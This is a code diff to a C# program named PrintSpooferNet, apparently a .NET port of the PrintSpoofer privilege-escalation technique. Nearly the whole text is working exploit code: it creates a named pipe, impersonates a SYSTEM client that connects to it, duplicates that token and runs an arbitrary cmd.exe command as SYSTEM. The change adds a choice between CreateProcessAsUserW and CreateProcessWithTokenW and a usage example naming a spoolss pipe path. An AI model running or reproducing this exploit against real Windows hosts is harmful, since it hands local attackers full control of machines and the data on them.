@@ -13,10 +13,12 @@ namespace PrintSpooferNet
             public IntPtr Sid;
             public int Attributes;
         }
+
         public struct TOKEN_USER
         {
             public SID_AND_ATTRIBUTES User;
         }
+
         [StructLayout(LayoutKind.Sequential)]
         public struct PROCESS_INFORMATION
         {
@@ -25,6 +27,7 @@ namespace PrintSpooferNet
             public int dwProcessId;
             public int dwThreadId;
         }
+
         [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
         public struct STARTUPINFO
         {
@@ -72,38 +75,38 @@ namespace PrintSpooferNet
         [DllImport("Advapi32.dll")]
         static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);
 
-        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        [DllImport("Advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);
 
-        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
+        [DllImport("Advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
         public static extern bool CreateProcessWithTokenW(IntPtr hToken, UInt32 dwLogonFlags, string lpApplicationName, string lpCommandLine, UInt32 dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
 
         [DllImport("kernel32.dll")]
         private static extern IntPtr GetCurrentThread();
 
-        [DllImport("advapi32.dll", SetLastError = true)]
+        [DllImport("Advapi32.dll", SetLastError = true)]
         static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);                        //Pointer to handle thats open
 
-        [DllImport("advapi32.dll", SetLastError = true)]
+        [DllImport("Advapi32.dll", SetLastError = true)]
         static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);                          //
 
-        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
+        [DllImport("Advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         static extern bool ConvertSidToStringSid(IntPtr pSID, out IntPtr ptrSid);
 
-        [DllImport("advapi32.dll", SetLastError = true)]
+        [DllImport("Advapi32.dll", SetLastError = true)]
         static extern bool RevertToSelf();
+        
         [DllImport("kernel32.dll")]
         static extern uint GetSystemDirectory([Out] StringBuilder lpBuffer, uint uSize);
+        
         [DllImport("userenv.dll", SetLastError = true)]
         static extern bool CreateEnvironmentBlock(out IntPtr lpEnvironment, IntPtr hToken, bool bInherit);
 
-        //https://github.com/CCob/SweetPotato/blob/d153e821934fa6619e669fcc32e95e8f8b2043bb/Security/Privilege.cs#L144
-        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
-        public static extern bool CreateProcessAsUserW(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
-             bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+        [DllImport("Advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern bool CreateProcessAsUserW(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
 
 
-        static void Main(string[] args)
+        public static void Main(string[] args)
         {
             uint PIPE_WAIT = 0x00000000;
             uint PIPE_TYPE_BYTE = 0x00000000;
@@ -114,13 +117,33 @@ namespace PrintSpooferNet
             si.cb = Marshal.SizeOf(si);
             si.lpDesktop = "WinSta0\\Default";
 
-            if (args.Length == 0)
+            if (args.Length <= 2)
             {
-                Console.WriteLine("Usage: PrintSpooferNet.exe pipename \"CMD COMMAND\"");
+                Console.WriteLine("Usage: PrintSpooferNet.exe pipename \"<Command>\" <CreateProcessAsUserW, CreateProcessWithTokenW>");
+                Console.WriteLine("Example: C:\\PrintSpooferNet.exe \\\\.\\pipe\\test\\pipe\\spoolss \"calc.exe\" ");
                 return;
             }
             string pipeName = args[0];
             string ExecCommand = args[1];
+            bool CreateProcessAsUserWMethod = false;
+            bool CreateProcessWithTokenWMethod = false;
+            if (args[2] == "CreateProcessAsUserW")
+            {
+                CreateProcessAsUserWMethod = true;
+                Console.WriteLine("[*] Using CreateProcessAsUserW");
+            }
+            else if (args[2] == "CreateProcessWithTokenW")
+            {
+                CreateProcessWithTokenWMethod = true;
+                Console.WriteLine("[*] Using CreateProcessWithTokenW");
+            }
+            else
+            {
+                Console.WriteLine("Usage: PrintSpooferNet.exe pipename \"<Command>\" <CreateProcessAsUserW, CreateProcessWithTokenW>");
+                Console.WriteLine("Example: C:\\PrintSpooferNet.exe \\\\.\\pipe\\test\\pipe\\spoolss \"calc.exe\" ");
+                return;
+            }
+
             IntPtr hPipe = CreateNamedPipe(pipeName, 3, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 0x1000, 0x1000, 0, IntPtr.Zero);
             if (hPipe.ToInt32() == -1)
             {
@@ -131,10 +154,8 @@ namespace PrintSpooferNet
 
             ConnectNamedPipe(hPipe, IntPtr.Zero);
             Console.WriteLine("[+] Pipe Connection");
-            Console.WriteLine("[+] " + "C:\\Windows\\System32\\cmd.exe /c " + ExecCommand);
             ImpersonateNamedPipeClient(hPipe);
             OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out hToken);
-
             DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out hSystemToken);
 
             StringBuilder sbSystemDir = new StringBuilder(256);
@@ -143,13 +164,21 @@ namespace PrintSpooferNet
             bool res = CreateEnvironmentBlock(out env, hSystemToken, false);
 
             String name = WindowsIdentity.GetCurrent().Name;
-            Console.WriteLine("Impersonated user is: " + name);
+            Console.WriteLine("[+] Impersonated user is: " + name);
+            Console.WriteLine("\t|_ C:\\Windows\\System32\\cmd.exe /c " + ExecCommand);
 
-            //RevertToSelf();
-            ExecCommand = "/c " + ExecCommand; 
-
-            res = CreateProcessAsUserW(hSystemToken, "C:\\Windows\\System32\\cmd.exe", ExecCommand, IntPtr.Zero, IntPtr.Zero, false, (uint)CreationFlags.UnicodeEnvironment, env, sbSystemDir.ToString(), ref si, out pi);
-            //res = CreateProcessWithTokenW(hSystemToken, (uint)LogonFlags.WithProfile, null, "C:\\Windows\\System32\\cmd.exe /c " + ExecCommand, (uint)CreationFlags.UnicodeEnvironment, env, sbSystemDir.ToString(), ref si, out pi); //Change Local Executable Path
+            if (CreateProcessAsUserWMethod)
+            {
+                ExecCommand = "/c " + ExecCommand; // Quick patch for CreateProcessAsUserW exec method
+                res = CreateProcessAsUserW(hSystemToken, "C:\\Windows\\System32\\cmd.exe", ExecCommand, IntPtr.Zero, IntPtr.Zero, false, (uint)CreationFlags.UnicodeEnvironment, env, sbSystemDir.ToString(), ref si, out pi);
+                return; 
+            }
+            if (CreateProcessWithTokenWMethod)
+            {
+                RevertToSelf();
+                res = CreateProcessWithTokenW(hSystemToken, (uint)LogonFlags.WithProfile, null, "C:\\Windows\\System32\\cmd.exe /c " + ExecCommand, (uint)CreationFlags.UnicodeEnvironment, env, sbSystemDir.ToString(), ref si, out pi); //Change Local Executable Path
+                return;
+            }
         }
     }
 }
